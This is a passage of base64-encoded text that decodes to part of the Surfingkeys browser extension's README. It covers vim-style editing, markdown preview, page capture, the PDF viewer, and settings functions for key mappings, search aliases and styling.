ODgyMDcvMTc2NDQyMTkvNzVhNzJiMmUtNjFiMy0xMWU2LThjZTItMDZjOWNj
OTRhZWNhLmdpZikKCkZvciBgPHRleHRhcmVhPmAgZWxlbWVudHMsIHRoZSB2
aW0gZWRpdG9yIGlzIG9wZW5lZCBpbiBiaWdnZXIgc2l6ZS4gQWZ0ZXIgeW91
IGNvbXBsZXRlIHlvdXIgZWRpdHMsIHByZXNzIGBDdHJsLUVudGVyYCBvciBg
OndgIHRvIHdyaXRlIHlvdXIgdGV4dCBiYWNrIHRvIHRoZSBgPHRleHRhcmVh
PmAgZWxlbWVudC4KCiFbdGV4dGFyZWFfd2l0aF92aW1dKGh0dHBzOi8vY2xv
dWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8yODgyMDcvMTc2NDQy
MTcvNzVhMjdlNDQtNjFiMy0xMWU2LThmMjEtOWNkNzlkM2M1Nzc2LmdpZikK
CkZvciBgPHNlbGVjdD5gIGVsZW1lbnRzLCB0aGUgdmltIGVkaXRvciBpcyBh
Z2FpbiBvcGVuZWQgaW4gYmlnZ2VyIHNpemUuIEluc3RlYWQgb2YgZWRpdGlu
ZyB0aGUgdGV4dCwgc2VhcmNoIGZvciB0aGUgZGVzaXJlZCBvcHRpb24gYW5k
IGp1bXAgdG8gdGhlIGxpbmUsIHRoZW4gcHJlc3MgYEVudGVyYCB0byBzZWxl
Y3QgaXQuIFRoaXMgaXMgaGFuZHkgZm9yIGA8c2VsZWN0PmAgZWxlbWVudHMg
d2hpY2ggaGF2ZSBsb3RzIG9mIG9wdGlvbnMuCgohW3NlbGVjdF93aXRoX3Zp
bV0oaHR0cHM6Ly9jbG91ZC5naXRodWJ1c2VyY29udGVudC5jb20vYXNzZXRz
LzI4ODIwNy8xNzY0NDIxOC83NWE0NThhNC02MWIzLTExZTYtOGNlNy1lZWRj
Yzk5Njc0NWMuZ2lmKQoKYEVzY2Agb3IgYDpxYCB0byBxdWl0IHZpbSBlZGl0
b3Igd2l0aG91dCB3cml0aW5nIHRleHQgYmFjay4KCmBUYWJgIGNvbXBsZXRp
b24gd29ya3Mgd2l0aCBhbGwgd29yZHMgb24gY3VycmVudCBwYWdlLCBgU3Bh
Y2VgIHRvIGNob29zZSBhIG1hdGNoIGZyb20gcG9wdXAuCgpJZiB5b3UgZW50
ZXIgaW5zZXJ0IG1vZGUgd2l0aCBgaWAgb3IgbW91c2UgY2xpY2ssIHlvdSB3
aWxsIGVkaXQgeW91ciBpbnB1dCBpbiBub3JtYWwgd2F5LiBZb3UgY291bGQg
YWxzbyBvcGVuIHZpbSBlZGl0b3IgYXQgdGhhdCB0aW1lIGJ5IHByZXNzaW5n
IGBDdHJsLWlgLgoKUmVtZW1iZXIgdGhhdCBpbiBpbnNlcnQgbW9kZSwgcHJl
c3MgYEN0cmwtaWAgdG8gb3BlbiB0aGUgdmltIGVkaXRvci4KCiMjIyBFZGl0
IFVSTCB0byBvcGVuIGluIG5ldyB0YWIKCmBzdWAgdG8gb3BlbiB2aW0gZWRp
dG9yIHRvIGVkaXQgY3VycmVudCBVUkwsIHRoZW4gYEVudGVyYCBvciBgOndg
IHRvIG9wZW4gdGhlIGlucHV0IFVSTCwgd2hpY2ggd29ya3MganVzdCBsaWtl
IGFkZHJlc3MgYmFyIHdpdGggdmltLWJpbmRpbmcga2V5cy4KCmBUYWJgIGNv
bXBsZXRpb24gd29ya3Mgd2l0aCBhbGwgVVJMcyBmcm9tIGJvb2ttYXJrL2hp
c3RvcnksIGBTcGFjZWAgdG8gY2hvb3NlIGEgbWF0Y2ggZnJvbSBwb3B1cC4K
CiFbdXJsX3dpdGhfdmltXShodHRwczovL2Nsb3VkLmdpdGh1YnVzZXJjb250
ZW50LmNvbS9hc3NldHMvMjg4MjA3LzE3NjQ0MjIwLzc1ZjhlZWRjLTYxYjMt
MTFlNi05NjMwLWRhMjI1MGFjNWYxMC5naWYpCgojIyMgRWRpdCBzZXR0aW5n
cwoKYHNlYCB0byBvcGVuIHNldHRpbmdzIGVkaXRvciwgYDp3YCB0byBzYXZl
IHNldHRpbmdzLgoKIyMgRG90IHRvIHJlcGVhdCBwcmV2aW91cyBhY3Rpb24K
CltSZXBlYXRpbmcgcHJldmlvdXMgYWN0aW9uc10oaHR0cHM6Ly9naXRodWIu
Y29tL2Jyb29raG9uZy9TdXJmaW5na2V5cy9pc3N1ZXMvNjcpCgpBbGwga2V5
c3Ryb2tlcyBpbiBub3JtYWwgbW9kZSBhcmUgcmVwZWF0YWJsZSBieSBkb3Qs
IGV4Y2VwdCB0aG9zZSBrZXlzdHJva2VzIG1hcHBlZCB3aXRoIGByZXBlYXRJ
Z25vcmVgIGFzIGB0cnVlYCwgZm9yIGV4YW1wbGUsCgogICAgbWFwa2V5KCdl
JywgJyMyU2Nyb2xsIGEgcGFnZSB1cCcsIGZ1bmN0aW9uKCkgewogICAgICAg
IE5vcm1hbC5zY3JvbGwoInBhZ2VVcCIpOwogICAgfSwge3JlcGVhdElnbm9y
ZTogdHJ1ZX0pOwoKVGhlbiBgLmAgd2lsbCBub3QgcmVwZWF0IGFjdGlvbiB0
byBwYWdlIHVwLCBldmVuIGBlYCBpcyBqdXN0IHByZXNzZWQuCgojIyBNYXJr
ZG93biBwcmV2aWV3CgoxLiBjb3B5IHlvdXIgbWFya2Rvd24gc291cmNlIGlu
dG8gY2xpcGJvYXJkLgoxLiBgc21gIHRvIG9wZW4gbWFya2Rvd24gcHJldmll
dywgd2hpY2ggd2lsbCBwcmV2aWV3IG1hcmtkb3duIGZyb20gY2xpcGJvYXJk
LgoxLiBUaGVuIG9uIHRoZSBwcmV2aWV3IHBhZ2UsIGFub3RoZXIgYHNtYCB3
aWxsIG9wZW4gdmltIGVkaXRvciB0byBlZGl0IG1hcmtkb3duIHNvdXJjZS4K
MS4gYDp3cWAgdG8gcmVmcmVzaCBwcmV2aWV3LgoxLiBgcmAgdG8gcmVsb2Fk
IG1hcmtkb3duIHNvdXJjZSBmcm9tIGNsaXBib2FyZC4KCiFbbWFya2Rvd25d
KGh0dHBzOi8vY2xvdWQuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Fzc2V0cy8y
ODgyMDcvMTc2Njk4OTcvMGI2ZmJhZjYtNjM0Mi0xMWU2LTg1ODMtODZlYjg2
OTExOTBkLmdpZikKCkJ5IGRlZmF1bHQsIFN1cmZpbmdrZXlzIHVzZXMgdGhp
cyBbbWFya2Rvd24gcGFyc2VyXShodHRwczovL2dpdGh1Yi5jb20vY2hqai9t
YXJrZWQpIHRvIHByZXZpZXcgbWFya2Rvd24sIGlmIHlvdSdkIGxpa2UgdG8g
dXNlIFtnaXRodWIgbWFya2Rvd24gQVBJXShodHRwczovL2RldmVsb3Blci5n
aXRodWIuY29tL3YzL21hcmtkb3duLykgdG8gcGFyc2UgeW91ciBtYXJrZG93
biwgcGxlYXNlIGFkZCBiZWxvdyBsaW5lIHRvIHlvdXIgc2V0dGluZ3M6Cgog
ICAgc2V0dGluZ3MudXNlTG9jYWxNYXJrZG93bkFQSSA9IGZhbHNlOwoKIyMg
Q2FwdHVyZSBwYWdlCgpUaGVyZSBhcmUgc29tZSBjaXJjdW1zdGFuY2VzIHRo
YXQgeW91IHdhbnQgdG8gdGFrZSBhIHNjcmVlbnNob3Qgb24gYSBwYWdlLCBi
ZWxvdyBzaG9ydGN1dHMgY291bGQgaGVscCB5b3UsIGVzcGVjaWFsbHkgd2hl
biBpdCBpcyBmb3IgYSBsb25nIHBhZ2Ugb3IganVzdCBmb3Igc29tZSBzY3Jv
bGxhYmxlIERJViBvbiB0aGUgcGFnZS4KCiogYHlnYCB0byBjYXB0dXJlIGN1
cnJlbnQgcGFnZS4KKiBgeUdgIHRvIGNhcHR1cmUgY3VycmVudCBmdWxsIHBh
Z2UgaWYgaXQgaXMgc2Nyb2xsYWJsZS4KKiBgeVNgIHRvIGNhcHR1cmUgY3Vy
cmVudCBzY3JvbGwgdGFyZ2V0LgoKQWZ0ZXIgb25lIG9mIGFib3ZlIHNob3J0
Y3V0cyBwcmVzc2VkLCB5b3UgY291bGQgc2VlIGEgcG9wdXAgb2YgY2FwdHVy
ZWQgaW1hZ2UsIG9uIHdoaWNoIHlvdSBjb3VsZCB0aGVuIHJpZ2h0IGNsaWNr
IHdpdGggYSBNT1VTRSgg8J+YoiApIHRvIHNhdmUgYXMgb3IgY29weSBpbnRv
IHN5c3RlbSBjbGlwYm9hcmQuCgojIyBNZXJtYWlkIGRpYWdyYW0gZ2VuZXJh
dG9yCgpbTWVybWFpZF0oaHR0cHM6Ly9naXRodWIuY29tL2tuc3YvbWVybWFp
ZCkgaXMgYSBncmVhdCB0b29sIHRvIGdlbmVyYXRlIGRpYWdyYW1zIGFuZCBm
bG93Y2hhcnRzIGZyb20gdGV4dCBpbiBhIHNpbWlsYXIgbWFubmVyIGFzIG1h
cmtkb3duLgpTdXJmaW5na2V5cyBwcm92aWRlcyBhIHNpbXBsZSBmcm9udGVu
ZCB0byBnZW5lcmF0ZSBkaWFncmFtcyBmcm9tIHRleHQgaW4gY2xpcGJvYXJk
LCBhbmQgYSB2aW0gZWRpdG9yIHRvIGVkaXQgaXQuCgpgQ3RybC1BbHQtZGAg
dG8gb3BlbiBpdC4KCiMjIFBERiB2aWV3ZXIKVG8gbWFrZSBTdXJmaW5na2V5
cyB3b3JrIGZvciBQREYgZmlsZXMsIFN1cmZpbmdrZXlzIGludGVncmF0ZXMg
UERGIHZpZXdlciBmcm9tIHRoZSBub3RhYmxlIFtwZGYuanNdKGh0dHBzOi8v
Z2l0aHViLmNvbS9tb3ppbGxhL3BkZi5qcykuIFdoZW4gYSBwZGYgZmlsZSBp
cyBvcGVuZWQgaW4gQ2hyb21lLCB0aGUgUERGIHZpZXdlciB3aWxsIGJlIGxh
dW5jaGVkLCBhbmQgeW91IGNvdWxkIHVzZSBldmVyeXRoaW5nIGZyb20gU3Vy
ZmluZ2tleXMgdGhlbi4KCklmIHlvdSB3b3VsZCBsaWtlIHRvIHVzZSBvcmln
aW5hbCBwZGYgdmlld2VyIHByb3ZpZGVkIGJ5IENocm9tZSBpdHNlbGYsIHVz
ZSBgO3NgIHRvIHRvZ2dsZSB0aGF0LgoKU29tZSBmdW5jdGlvbmFsaXRpZXMg
YXJlIGFsc28gYXZhaWxhYmxlIHdoZW4geW91J3JlIHVzaW5nIG9yaWdpbmFs
IHBkZiB2aWV3ZXIsIGJ1dCBzb21lIGZ1bmN0aW9uYWxpdGllcyBzdWNoIGFz
IHNtb290aCBzY3JvbGwvdmlzdWFsIG1vZGUgZXRjIHdvbid0IGJlIGF2YWls
YWJsZS4KCiMjIEVkaXQgeW91ciBvd24gc2V0dGluZ3MKCiMjIyBNYXAgYSBr
ZXlzdHJva2UgdG8gc29tZSBhY3Rpb24KCiAgICBtYXBrZXkoa2V5c3Ryb2tl
LCBoZWxwX3N0cmluZywgYWN0aW9uX2NvZGUsIFtvcHRpb25zXSkKCnwgcGFy
YW1ldGVyICB8IGV4cGxhbmF0aW9uIHwKfDotLS0tLS0tLS0tLS0tLS18IDot
LS0tLXwKfCoqa2V5c3Ryb2tlKiogICAgICAgICAgICAgICAgICAgfCBzdHJp
bmcsIGFueSBrZXlzdHJva2UgdG8gdHJpZ2dlciB0aGUgYWN0aW9ufAp8Kipo
ZWxwX3N0cmluZyoqICAgICAgICAgICAgICAgICB8IHN0cmluZywgYSBoZWxw
IG1lc3NhZ2UgdG8gZGVzY3JpYmUgdGhlIGFjdGlvbiwgd2hpY2ggd2lsbCBk
aXNwbGF5ZWQgaW4gaGVscCBvcGVuZWQgYnkgYHVgLnwKfCoqYWN0aW9uX2Nv
ZGUqKiAgICAgICAgICAgICAgICAgfCBmdW5jdGlvbiwgYSBKYXZhc2NyaXB0
IGZ1bmN0aW9uIHRvIGJlIGJvdW5kLiBJZiB0aGUgZnVuY3Rpb24gbmVlZHMg
YW4gYXJndW1lbnQsIG5leHQgcHJlc3NlZCBrZXkgd2lsbCBiZSBmZWQgdG8g
dGhlIGZ1bmN0aW9uLnwKfCoqb3B0aW9ucyoqICAgICAgICAgICAgICAgICAg
ICAgfCBvYmplY3QsIHByb3BlcnRpZXMgbGlzdGVkIGJlbG93fAp8Kipkb21h
aW4qKiAgICAgICAgICAgICAgICAgICAgICB8IHJlZ2V4W29wdGlvbmFsXSwg
YSBKYXZhc2NyaXB0IHJlZ2V4IHBhdHRlcm4gdG8gaWRlbnRpZnkgdGhlIGRv
bWFpbnMgdGhhdCB0aGlzIG1hcHBpbmcgd29ya3MsIGZvciBleGFtcGxlLCBg
L2dpdGh1YlwuY29tL2lgIHNheXMgdGhhdCB0aGlzIG1hcHBpbmcgd29ya3Mg
b25seSBmb3IgZ2l0aHViLmNvbS58CnwqKnJlcGVhdElnbm9yZSoqICAgICAg
ICAgICAgICAgIHwgYm9vbGVhbltvcHRpb25hbF0sIHdoZXRoZXIgdGhpcyBr
ZXlzdHJva2Ugd2lsbCBiZSByZXBlYXQgYnkgZG90IGNvbW1hbmQufAoKSnVz
dCBhbiBleGFtcGxlIHRvIG1hcCBvbmUga2V5c3Ryb2tlIHRvIGRpZmZlcmVu
dCBmdW5jdGlvbnMgb24gZGlmZmVyZW50IHNpdGVzLAoKICAgIG1hcGtleSgn
enonLCAnQ2hvb3NlIGEgdGFiJywgZnVuY3Rpb24oKSB7CiAgICAgICAgRnJv
bnQuY2hvb3NlVGFiKCk7CiAgICB9LCB7ZG9tYWluOiAvZ2l0aHViXC5jb20v
aX0pOwogICAgbWFwa2V5KCd6eicsICdTaG93IHVzYWdlJywgZnVuY3Rpb24o
KSB7CiAgICAgICAgRnJvbnQuc2hvd1VzYWdlKCk7CiAgICB9LCB7ZG9tYWlu
OiAvZ29vZ2xlXC5jb20vaX0pOwoKbWFwa2V5IGluIHZpc3VhbCBtb2RlIGFu
ZCBvbW5pYmFyIGJhci4KCiAgICB2bWFwa2V5KGtleXN0cm9rZSwgaGVscF9z
dHJpbmcsIGFjdGlvbl9jb2RlLCBbb3B0aW9uc10pCgojIyMgbWFwIGEga2V5
c3Ryb2tlIHRvIGFub3RoZXIKCiAgICBtYXAobmV3X2tleXN0cm9rZSwgb2xk
X2tleXN0cm9rZSwgW2RvbWFpbl9wYXR0ZXJuXSwgW25ld19hbm5vdGF0aW9u
XSkKCiAgICBpbWFwKG5ld19rZXlzdHJva2UsIG9sZF9rZXlzdHJva2UsIFtk
b21haW5fcGF0dGVybl0sIFtuZXdfYW5ub3RhdGlvbl0pCgogICAgdm1hcChu
ZXdfa2V5c3Ryb2tlLCBvbGRfa2V5c3Ryb2tlLCBbZG9tYWluX3BhdHRlcm5d
LCBbbmV3X2Fubm90YXRpb25dKQoKICAgIGNtYXAobmV3X2tleXN0cm9rZSwg
b2xkX2tleXN0cm9rZSwgW2RvbWFpbl9wYXR0ZXJuXSwgW25ld19hbm5vdGF0
aW9uXSkKCnwgcGFyYW1ldGVyICB8IGV4cGxhbmF0aW9uIHwKfDotLS0tLS0t
LS0tLS0tLS18IDotLS0tLXwKfCoqbmV3X2tleXN0cm9rZSoqICAgICAgICAg
ICAgICAgfCBzdHJpbmcsIHRoZSBuZXcga2V5c3Ryb2tlIHRoYXQgd2lsbCBi
ZSB1c2VkLnwKfCoqb2xkX2tleXN0cm9rZSoqICAgICAgICAgICAgICAgfCBz
dHJpbmcsIHRoZSBleGlzdGluZyBrZXlzdHJva2UgdGhhdCB3aWxsIGJlIHJl
cGxhY2VkLCB3aGljaCBtZWFucyBwcmVzc2luZyBpdCB3aWxsIG5vdCB0cmln
Z2VyIGFueSBhY3Rpb24ufAp8Kipkb21haW5fcGF0dGVybioqICAgICAgICAg
ICAgICB8IHJlZ2V4W29wdGlvbmFsXSwgYSBKYXZhc2NyaXB0IHJlZ2V4IHBh
dHRlcm4gdG8gaWRlbnRpZnkgdGhlIGRvbWFpbnMgdGhhdCB0aGlzIG1hcHBp
bmcgd29ya3MufAp8KipuZXdfYW5ub3RhdGlvbioqICAgICAgICAgICAgICB8
IHN0cmluZ1tvcHRpb25hbF0sIHVzZSBpdCBpbnN0ZWFkIG9mIHRoZSBhbm5v
dGF0aW9uIGZyb20gb2xkX2tleXN0cm9rZSBpZiBwcm92aWRlZC58CgojIyMg
cmVtb3ZlIGEga2V5c3Ryb2tlIG1hcHBpbmcKCk5vcm1hbCBtb2RlLAoKICAg
IHVubWFwKGtleXN0cm9rZSwgW2RvbWFpbl9wYXR0ZXJuXSkKCkluc2VydCBt
b2RlLAoKICAgIGl1bm1hcChrZXlzdHJva2UsIFtkb21haW5fcGF0dGVybl0p
CgpWaXN1YWwgbW9kZSwKCiAgICB2dW5tYXAoa2V5c3Ryb2tlLCBbZG9tYWlu
X3BhdHRlcm5dKQoKfCBwYXJhbWV0ZXIgIHwgZXhwbGFuYXRpb24gfAp8Oi0t
LS0tLS0tLS0tLS0tLXwgOi0tLS0tfAp8KiprZXlzdHJva2UqKiAgICAgICAg
ICAgICAgICAgICB8IHN0cmluZywgdGhlIGV4aXN0aW5nIGtleXN0cm9rZSB0
aGF0IHdpbGwgYmUgcmVtb3ZlZC58CnwqKmRvbWFpbl9wYXR0ZXJuKiogICAg
ICAgICAgICAgIHwgcmVnZXhbb3B0aW9uYWxdLCBhIEphdmFzY3JpcHQgcmVn
ZXggcGF0dGVybiB0byBpZGVudGlmeSB0aGUgZG9tYWlucyB0aGF0IHRoaXMg
c2V0dGluZ3Mgd29ya3MufAoKIyMjIHJlbW92ZSBhbGwga2V5c3Ryb2tlIG1h
cHBpbmdzCgogICAgdW5tYXBBbGxFeGNlcHQoa2V5c3Ryb2tlcywgW2RvbWFp
bl9wYXR0ZXJuXSkKCnwgcGFyYW1ldGVyICB8IGV4cGxhbmF0aW9uIHwKfDot
LS0tLS0tLS0tLS0tLS18IDotLS0tLXwKfCoqa2V5c3Ryb2tlcyoqICAgICAg
ICAgICAgICAgICAgfCBhcnJheSBvZiBzdHJpbmcsIHRoZSBleGlzdGluZyBr
ZXlzdHJva2VzIHRoYXQgd2lsbCBiZSByZW1vdmVkLnwKfCoqZG9tYWluX3Bh
dHRlcm4qKiAgICAgICAgICAgICAgfCByZWdleFtvcHRpb25hbF0sIGEgSmF2
YXNjcmlwdCByZWdleCBwYXR0ZXJuIHRvIGlkZW50aWZ5IHRoZSBkb21haW5z
IHRoYXQgdGhpcyBzZXR0aW5ncyB3b3Jrcy58CgpFeGFtcGxlLAoKICAgIHVu
bWFwQWxsRXhjZXB0KFsnZicsICcvJywgJz8nXSk7CgojIyMgQWRkIHNlYXJj
aCBhbGlhcyB0byBvbW5pYmFyCgogICAgYWRkU2VhcmNoQWxpYXMoYWxpYXMs
IHByb21wdCwgc2VhcmNoX3VybCwgc3VnZ2VzdGlvbl91cmwsIGNhbGxiYWNr
X3RvX3BhcnNlX3N1Z2dlc3Rpb24pOwoKfCBwYXJhbWV0ZXIgIHwgZXhwbGFu
YXRpb24gfAp8Oi0tLS0tLS0tLS0tLS0tLXwgOi0tLS0tfAp8KiphbGlhcyoq
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IG9uZSBvciBz
ZXZlcmFsIGNoYXJzLCB1c2VkIGFzIHNlYXJjaCBhbGlhcy4gV2hlbiB5b3Ug
aW5wdXQgdGhlIHN0cmluZyBhbmQgcHJlc3MgYHNwYWNlYCBpbiBvbW5pYmFy
LCBpdCB3aWxsIHN3aXRjaCB0byB0aGUgcmVsYXRlZCBzZWFyY2ggZW5naW5l
LnwKfCoqcHJvbXB0KiogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgfCBhIHN0cmluZyB0byB0ZWxsIHlvdSB3aGljaCBzZWFyY2ggZW5naW5l
IHdpbGwgYmUgdXNlZCBmb3IgZm9sbG93aW5nIHNlYXJjaHwKfCoqc2VhcmNo
X3VybCoqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCB0aGUgVVJM
IGZvciB0aGUgc2VhcmNoIGVuZ2luZXwKfCoqc3VnZ2VzdGlvbl91cmxbb3B0
aW9uYWxdKiogICAgICAgICAgICAgICAgfCBvbW5pYmFyIHdpbGwgbGlzdCBv
dXQgc2VhcmNoIHN1Z2dlc3Rpb25zIGZyb20gdGhlIGVuZ2luZSwgaWYgeW91
IHByb3ZpZGUgc3VnZ2VzdGlvbl91cmwgYW5kIGNhbGxiYWNrX3RvX3BhcnNl
X3N1Z2dlc3Rpb258CnwqKmNhbGxiYWNrX3RvX3BhcnNlX3N1Z2dlc3Rpb25b
b3B0aW9uYWxdKiogIHwgd29ya3Mgd2l0aCBzdWdnZXN0aW9uX3VybCB0byBw
cm92aWRlIHNlYXJjaCBzdWdnZXN0aW9ufAoKICAgIGFkZFNlYXJjaEFsaWFz
WChhbGlhcywgcHJvbXB0LCBzZWFyY2hfdXJsLCBzZWFyY2hfbGVhZGVyX2tl
eSwgc3VnZ2VzdGlvbl91cmwsIGNhbGxiYWNrX3RvX3BhcnNlX3N1Z2dlc3Rp
b24sIG9ubHlfdGhpc19zaXRlX2tleSk7Cgp8IHBhcmFtZXRlciAgfCBleHBs
YW5hdGlvbiB8Cnw6LS0tLS0tLS0tLS0tLS0tfCA6LS0tLS18CnwqKnNlYXJj
aF9sZWFkZXJfa2V5KiogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIHwgb25lIG9yIHNldmVyYWwgY2hhcnMsIHVzZWQgYXMgc2VhcmNoIGxl
YWRlciBrZXksIGluIGNhc2Ugb2YgdGhhdCB5b3Ugd291bGQgbm90IGxpa2Ug
dG8gdXNlIHRoZSBkZWZhdWx0IGtleSBgc2AufAp8Kipvbmx5X3RoaXNfc2l0
ZV9rZXkqKiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8IG9u
ZSBvciBzZXZlcmFsIGNoYXJzLCB1c2VkIGFzIG9ubHktdGhpcy1zaXRlLWtl
eSwgaW4gY2FzZSBvZiB0aGF0IHlvdSB3b3VsZCBub3QgbGlrZSB0byB1c2Ug
dGhlIGRlZmF1bHQga2V5IGBvYC58CgpUaGlzIHZlcnNpb24gd2lsbCBjcmVh
dGUgYSBtYXBwaW5nIHRvIHNlYXJjaCBzZWxlY3RlZCB0ZXh0IHdpdGggYHNl
YXJjaF91cmxgIG9uIHByZXNzaW5nIGBzZWFyY2hfbGVhZGVyX2tleWAgZm9s
bG93ZWQgYnkgYGFsaWFzYCwgZXhjZXB0IHRoYXQgaXQgYWRkcyBzZWFyY2gg
YWxpYXMgdG8gb21uaWJhciBhcyB0aGUgbm9ybWFsIHZlcnNpb24uIEZvciBl
eGFtcGxlLCBiZWxvdyBsaW5lCgogICAgYWRkU2VhcmNoQWxpYXNYKCdzJywg
J3N0YWNrb3ZlcmZsb3cnLCAnaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3Nl
YXJjaD9xPScsICdvJyk7Cgp3b3JrcyBsaWtlCgogICAgYWRkU2VhcmNoQWxp
YXMoJ3MnLCAnc3RhY2tvdmVyZmxvdycsICdodHRwOi8vc3RhY2tvdmVyZmxv
dy5jb20vc2VhcmNoP3E9Jyk7CiAgICBtYXBrZXkoJ29zJywgJ1NlYXJjaCBT
ZWxlY3RlZCB3aXRoIHN0YWNrb3ZlcmZsb3cnLCBmdW5jdGlvbigpIHsKICAg
ICAgICBzZWFyY2hTZWxlY3RlZFdpdGgoImh0dHA6Ly9zdGFja292ZXJmbG93
LmNvbS9zZWFyY2g/cT0iKTsKICAgIH0pOwogICAgdm1hcGtleSgnb3MnLCAn
U2VhcmNoIFNlbGVjdGVkIHdpdGggc3RhY2tvdmVyZmxvdycsIGZ1bmN0aW9u
KCkgewogICAgICAgIHNlYXJjaFNlbGVjdGVkV2l0aCgiaHR0cDovL3N0YWNr
b3ZlcmZsb3cuY29tL3NlYXJjaD9xPSIpOwogICAgfSk7CgojIyMgcmVtb3Zl
IHNlYXJjaCBhbGlhcyBhbmQgaXRzIGJpbmRpbmdzCgogICAgcmVtb3ZlU2Vh
cmNoQWxpYXNYKGFsaWFzLCBzZWFyY2hfbGVhZGVyX2tleSwgb25seV90aGlz
X3NpdGVfa2V5KTsKCiMjIyBPbW5pYmFyIGhlbHBlcnMKCiAgICBPbW5pYmFy
Lmxpc3RXb3Jkcyg8YXJyYXkgb2Ygd29yZHM+KQogICAgT21uaWJhci5odG1s
KDxhbnkgaHRtbCBzbmlwcGV0cz4pCgojIyMgU3R5bGluZwoKVG8gY2hhbmdl
IHN0eWxlIGZvciBsaW5rIGhpbnRzOgoKICAgIEhpbnRzLnN0eWxlKCdib3Jk
ZXI6IHNvbGlkIDNweCAjNTUyYTQ4OyBjb2xvcjojZWZlMWViOyBiYWNrZ3Jv
dW5kOiBpbml0aWFsOyBiYWNrZ3JvdW5kLWNvbG9yOiAjNTUyYTQ4OycpOwoK
VG8gQ2hhbmdlIHN0eWxlIGZvciB0ZXh0IGhpbnRzOgoKICAgIEhpbnRzLnN0
eWxlKCJib3JkZXI6IHNvbGlkIDhweCAjQzM4QTIyO3BhZGRpbmc6IDFweDti
YWNrZ3JvdW5kOiAjZTM5OTEzIiwgInRleHQiKTsKCkNoYW5nZSB0aGUgc3R5
bGUgb2YgdGhlIHNlYXJjaCBtYXJrcyBhbmQgY3Vyc29yOgoKICAgIFZpc3Vh
bC5zdHlsZSgnbWFya3MnLCAnYmFja2dyb3VuZC1jb2xvcjogIzg5YTFlMjsn
KTsKICAgIFZpc3VhbC5zdHlsZSgnY3Vyc29yJywgJ2JhY2tncm91bmQtY29s
b3I6ICM5MDY1Yjc7Jyk7CgojIyMgQ3JlYXRlIG1hcHBpbmcgaW4gdmltIGVk
aXRvcgoKICAgIGFjZVZpbU1hcChsaHMsIHJocywgY3R4KQoKRm9yIGV4YW1w
bGUsCgogICAgYWNlVmltTWFwKCdqaycsICc8RXNjPicsICdpbnNlcnQnKTsK
CiMjIyBQcm9wZXJ0aWVzIGxpc3QKCnwga2V5IHwgZGVmYXVsdCB2YWx1ZSB8
IGV4cGxhbmF0aW9uIHwKfDotLS0tLS0tLS0tLS0tLS18Oi0tLS0tfDotLS0t
LXwKfCBIaW50cy5jaGFyYWN0ZXJzIHwgImFzZGZncXdlcnR6eGN2YiIgfCBU
aGUgY2hhcmFjdGVycyBmb3IgZ2VuZXJhdGluZyBoaW50cy4gfAp8IEhpbnRz
Lm51bWVyaWNIaW50cyB8IGZhbHNlIHwgV2hldGhlciB0byB1c2UgZGlnaXQg
YXMgaGludCBsYWJlbCwgaWYgaXQgaXMgb24sIHlvdSBjb3VsZCB0eXBlIHRl
eHQgdG8gZmlsdGVyIGxpbmtzLiB8CnwgSGludHMuc2Nyb2xsS2V5cyB8ICIw
amtobEckIiB8IFRoZSBrZXlzIHRoYXQgY2FuIGJlIHVzZWQgdG8gc2Nyb2xs
IHBhZ2UgaW4gaGludHMgbW9kZS4gWW91IG5lZWQgbm90IGNoYW5nZSBpdCB1
bmxlc3MgdGhhdCB5b3UgaGF2ZSBjaGFuZ2VkIGBIaW50cy5jaGFyYWN0ZXJz
YC4gfAp8IHNldHRpbmdzLnNob3dNb2RlU3RhdHVzIHwgZmFsc2UgfCBXaGV0
aGVyIGFsd2F5cyB0byBzaG93IG1vZGUgc3RhdHVzLiB8Cnwgc2V0dGluZ3Mu
c2hvd1Byb3h5SW5TdGF0dXNCYXIgfCBmYWxzZSB8IFdoZXRoZXIgdG8gc2hv
dyBwcm94eSBpbmZvIGluIHN0YXR1cyBiYXIuIHwKfCBzZXR0aW5ncy5yaWNo
SGludHNGb3JLZXlzdHJva2UgfCA1MDAgfCBUaW1lb3V0KG1zKSB0byBzaG93
IHJpY2ggaGludHMgZm9yIGtleXN0cm9rZSwgMCB3aWxsIGRpc2FibGUgcmlj
aCBoaW50cy4gfAp8IHNldHRpbmdzLnVzZUxvY2FsTWFya2Rvd25BUEkgfCAg
dHJ1ZSB8IFdoZXRoZXIgdG8gdXNlIFtjaGpqL21hcmtlZF0oaHR0cHM6Ly9n
aXRodWIuY29tL2NoamovbWFya2VkKSB0byBwYXJzZSBtYXJrZG93biwgb3Ro
ZXJ3aXNlIHVzZSBnaXRodWIgbWFya2Rvd24gQVBJLiB8Cnwgc2V0dGluZ3Mu
Zm9jdXNPblNhdmVkIHwgdHJ1ZSB8IFdoZXRoZXIgdG8gZm9jdXMgdGV4dCBp
bnB1dCBhZnRlciBxdWl0dGluZyBmcm9tIHZpbSBlZGl0b3IuIHwKfCBzZXR0
aW5ncy5vbW5pYmFyTWF4UmVzdWx0cyB8IDEwIHwgSG93IG1hbnkgcmVzdWx0
cyB3aWxsIGJlIGxpc3RlZCBvdXQgZWFjaCBwYWdlIGZvciBPbW5pYmFyLiB8
Cnwgc2V0dGluZ3Mub21uaWJhclBvc2l0aW9uIHwgIm1pZGRsZSIgfCBXaGVy
ZSB0byBwb3NpdGlvbiBPbW5pYmFyLiBbIm1pZGRsZSIsICJib3R0b20iXSB8
Cnwgc2V0dGluZ3Mub21uaWJhclN1Z2dlc3Rpb24gfCBmYWxzZSB8IFNob3cg
c3VnZ2VzdGlvbiBVUkxzfAp8IHNldHRpbmdzLm9tbmliYXJTdWdnZXN0aW9u
VGltZW91dCB8IDIwMCB8IFRpbWVvdXQgZHVyYXRpb24gYmVmb3JlIE9tbmli
YXIgc3VnZ2VzdGlvbiBVUkxzIGFyZSBxdWVyaWVkLCBpbiBtaWxsaXNlY29u
ZHMuIEhlbHBzIHByZXZlbnQgdW5uZWNlc3NhcnkgSFRUUCByZXF1ZXN0cyBh
bmQgQVBJIHJhdGUtbGltaXRpbmcuIHwKfCBzZXR0aW5ncy5mb2N1c0ZpcnN0
